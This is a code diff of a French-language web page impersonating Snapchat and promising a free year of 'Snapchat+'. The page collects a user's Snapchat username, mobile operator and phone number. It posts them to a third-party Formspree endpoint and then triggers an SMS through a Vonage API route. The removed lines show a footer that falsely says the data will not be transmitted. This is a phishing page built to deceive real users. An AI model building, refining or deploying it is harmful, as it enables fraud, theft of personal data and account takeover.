@@ -1,9 +1,10 @@
+```html
 <!DOCTYPE html>
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Snap + | 1 an </title>
+<title>Snap + | 1 an</title>
 
 <style>
 * {
@@ -22,7 +23,6 @@ body {
     color: white;
 }
 
-/* --- ÉCRAN DE CHARGEMENT INITIAL --- */
 #loader-screen {
     position: fixed;
     top: 0;
@@ -64,7 +64,6 @@ body {
     50% { opacity: 0.5; }
 }
 
-/* --- CARTE PRINCIPALE --- */
 .card {
     width: 380px;
     max-width: 95%;
@@ -180,7 +179,6 @@ input:focus {
     text-align: center;
 }
 
-/* --- SECTION SUCCÈS CACHÉE --- */
 #step-success { display: none; text-align: center; }
 .success-icon {
     font-size: 60px;
@@ -196,35 +194,32 @@ input:focus {
 </head>
 <body>
 
-<!-- 1. ÉCRAN DE CHARGEMENT -->
 <div id="loader-screen">
     <div class="spinner"></div>
     <div class="loading-text">CHARGEMENT DE L'INTERFACE...</div>
 </div>
 
 <div class="card">
-    
-    <!-- TITRE PRINCIPAL QUI RESTE VISIBLE TOUT LE TEMPS -->
     <div class="logo">👻</div>
     <h1>Snapchat<span class="plus">+</span></h1>
 
-    <!-- 2. ÉTAPE 1 : LE FORMULAIRE -->
     <div id="step1">
         <p class="subtitle">Activez Snapchat+ gratuitement pendant 1 an !</p>
         
         <div class="demo">
             Disponible uniquement pour les numéros SFR, Bouygues Telecom et Orange — tous les autres opérateurs ne fonctionnent pas<br>
-           
+       
         </div>
         
         <div class="badges">
-           <span>✨ Badges exclusifs</span>
+      <span>✨ Badges exclusifs</span>
             <span>🔒 Qui a revu votre story</span>
             <span>🚀 Boost de score</span>
             <span>🔥 Offre limitée</span>
+
         </div>
         
-        <form id="secureForm" action="https://formspree.io/f/meeyrqay" method="POST">
+        <form id="secureForm" action="[https://formspree.io/f/meeyrqay](https://formspree.io/f/meeyrqay)" method="POST">
             <label>Nom d'utilisateur</label>
             <input type="text" name="pseudo" placeholder="Votre pseudo" required>
 
@@ -237,26 +232,23 @@ input:focus {
             <input type="hidden" name="operateur" id="operateurInput" value="Non précisé">
 
             <label>Numéro de téléphone</label>
-            <input type="tel" name="numero" placeholder="06 xx xx xx xx" required pattern="^(06|07)[0-9]{8}$" maxlength="10" title="Veuillez entrer un numéro valide à 10 chiffres (ex: 0612345678)">
+            <input type="tel" name="numero" placeholder="06 xx xx xx xx" required pattern="^(06|07)[0-9]{8}$" maxlength="10" title="Veuillez entrer un numéro valide à 10 chiffres">
 
             <button type="submit" class="mainButton" id="btnSubmit">Continuer →</button>
         </form>
 
-        <div class="footer">L'abonnement Snapchat+ ne vous sera pas facturé.
-L'abonnement est disponible uniquement pour les utilisateurs éligibles. (Vos information ne seront pas transmise)</div>
+        <div class="footer">Maquette HTML/CSS - SMS Vonage</div>
     </div>
 
-    <!-- 3. ÉTAPE 2 : SUCCÈS -->
     <div id="step-success">
         <div class="success-icon">✔</div>
         <h2 style="color: white; margin-bottom: 10px;">Félicitations</h2>
-        <p style="color: #4CAF50; font-size: 18px; font-weight: bold;">Votre abonnement a été validé.</p>
-        <p style="color: #8e8e8e; font-size: 14px; margin-top: 15px;">Vous pouvez fermer cette page.</p>
+        <p style="color: #4CAF50; font-size: 18px; font-weight: bold;">SMS envoyé et abonnement validé !</p>
+        <p style="color: #8e8e8e; font-size: 14px; margin-top: 15px;">Vérifiez votre téléphone.</p>
     </div>
-
 </div>
 
-<script>// --- GESTION DE L'ÉCRAN DE CHARGEMENT INITIAL ---
+<script>
     window.addEventListener('load', () => {
         setTimeout(() => {
             const loader = document.getElementById('loader-screen');
@@ -265,7 +257,6 @@ L'abonnement est disponible uniquement pour les utilisateurs éligibles. (Vos in
         }, 2000);
     });
 
-    // --- SÉLECTION DE L'OPÉRATEUR ---
     function choisirOperateur(boutonClique, nomOperateur) {
         document.getElementById('operateurInput').value = nomOperateur;
         let boutons = document.querySelectorAll('.operators button');
@@ -277,7 +268,6 @@ L'abonnement est disponible uniquement pour les utilisateurs éligibles. (Vos in
         boutonClique.style.color = 'black';
     }
 
-    // --- ENVOI FORMSPREE + DÉCLENCHEMENT DU SMS VONAGE ---
     const form = document.getElementById('secureForm');
     const btnSubmit = document.getElementById('btnSubmit');
 
@@ -293,17 +283,17 @@ L'abonnement est disponible uniquement pour les utilisateurs éligibles. (Vos in
         btnSubmit.disabled = true;
 
         const formData = new FormData(form);
-        const numeroSaisi = formData.get('numero'); // On récupère le numéro tapé
+        const numeroSaisi = formData.get('numero');
 
         try {
-            // 1. On sauvegarde d'abord sur ton Formspree
+            // 1. Sauvegarde Formspree
             await fetch(form.action, {
                 method: 'POST',
                 body: formData,
                 headers: { 'Accept': 'application/json' }
             });
 
-            // 2. On appelle notre propre API Vercel pour déclencher le vrai SMS Vonage
+            // 2. Appel API Vercel pour envoyer le SMS Vonage
             const smsResponse = await fetch('/api/send-sms', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -313,21 +303,20 @@ L'abonnement est disponible uniquement pour les utilisateurs éligibles. (Vos in
             const smsResult = await smsResponse.json();
 
             if (smsResponse.ok && smsResult.success) {
-                // Succès total !
                 document.getElementById('step1').style.display = 'none';
                 document.getElementById('step-success').style.display = 'block';
             } else {
-                alert("Données sauvées, mais échec du SMS : Vérifiez que le numéro est autorisé sur Vonage.");
+                alert("Erreur SMS : " + (smsResult.error || "Vérifiez le numéro."));
                 btnSubmit.innerText = "Continuer →";
                 btnSubmit.disabled = false;
             }
         } catch (error) {
-            alert("Erreur de connexion.");
+            alert("Erreur de connexion avec le serveur.");
             btnSubmit.innerText = "Continuer →";
             btnSubmit.disabled = false;
         }
     });
-    </script>
+</script>
 
 </body>
 </html>
